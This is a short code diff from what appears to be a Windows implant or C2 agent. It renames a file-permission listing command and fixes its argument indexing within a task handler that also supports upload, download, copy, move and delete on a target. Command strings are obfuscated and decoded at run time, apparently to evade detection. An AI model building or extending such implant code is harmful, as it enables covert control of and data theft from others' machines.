@@ -14,7 +14,7 @@ CP SOURCE DESTINATION
 MV SOURCE DESTINATION
 RM SOURCE
 LS /PATH
-ICACLS FILE /PATH/TO/FILE/ON/CLIENT
+ICACLS_FILE /PATH/TO/FILE/ON/CLIENT
 UPLOAD FILE_BYTES_B64 /PATH/TO/FILE/ON/TARGET
 DOWNLOAD /PATH/TO/FILE/ON/CLIENT
 */
@@ -72,7 +72,7 @@ BOOL IsTaskForFilesystem(LPVOID pTask)
         STRING_AGENT_CAP_DOWNLOAD_LEN,
         strAgentCapDownload);
 
-    static CHAR strAgentCapIcaclsFile[STRING_AGENT_CAP_ICACLS_FILE_LEN + 1] = ""; // "ICACLS FILE"
+    static CHAR strAgentCapIcaclsFile[STRING_AGENT_CAP_ICACLS_FILE_LEN + 1] = ""; // "ICACLS_FILE"
     DeobfuscateUtf8String(
         (PCHAR)STRING_AGENT_CAP_ICACLS_FILE,
         STRING_AGENT_CAP_ICACLS_FILE_LEN,
@@ -149,7 +149,7 @@ void HandleTaskFilesystem(IN WinApiCustom *pWinApiCustom, IN LPVOID pTask, OUT P
         STRING_AGENT_CAP_DOWNLOAD_LEN,
         strAgentCapDownload);
 
-    static CHAR strAgentCapIcaclsFile[STRING_AGENT_CAP_ICACLS_FILE_LEN + 1] = ""; // "ICACLS FILE"
+    static CHAR strAgentCapIcaclsFile[STRING_AGENT_CAP_ICACLS_FILE_LEN + 1] = ""; // "ICACLS_FILE"
     DeobfuscateUtf8String(
         (PCHAR)STRING_AGENT_CAP_ICACLS_FILE,
         STRING_AGENT_CAP_ICACLS_FILE_LEN,
@@ -264,16 +264,16 @@ void HandleTaskFilesystem(IN WinApiCustom *pWinApiCustom, IN LPVOID pTask, OUT P
         }
     }
 
-    //// List file security info - ICACLS FILE /PATH/TO/FILE/ON/CLIENT
+    //// List file security info - ICACLS_FILE /PATH/TO/FILE/ON/CLIENT
     else if (CompareBuffer(pTask, strAgentCapIcaclsFile, STRING_AGENT_CAP_ICACLS_FILE_LEN))
     {
-        if (NullSeparatedArrayNumOfStringElements((PCHAR)pTask) == 3)
+        if (NullSeparatedArrayNumOfStringElements((PCHAR)pTask) == 2)
         {
             SECURITY_INFO_CUSTOM securityInfoCustom;
             RtlZeroMemoryCustom((PBYTE)&securityInfoCustom, sizeof(securityInfoCustom));
 
             pWinApiCustom->GetFileSecurityInformationCustom(
-                NullSeparatedArrayStringAt((PCHAR)pTask, 2),
+                NullSeparatedArrayStringAt((PCHAR)pTask, 1),
                 &securityInfoCustom);
 
             pWinApiCustom->DescribeSecurityInfoCustom(
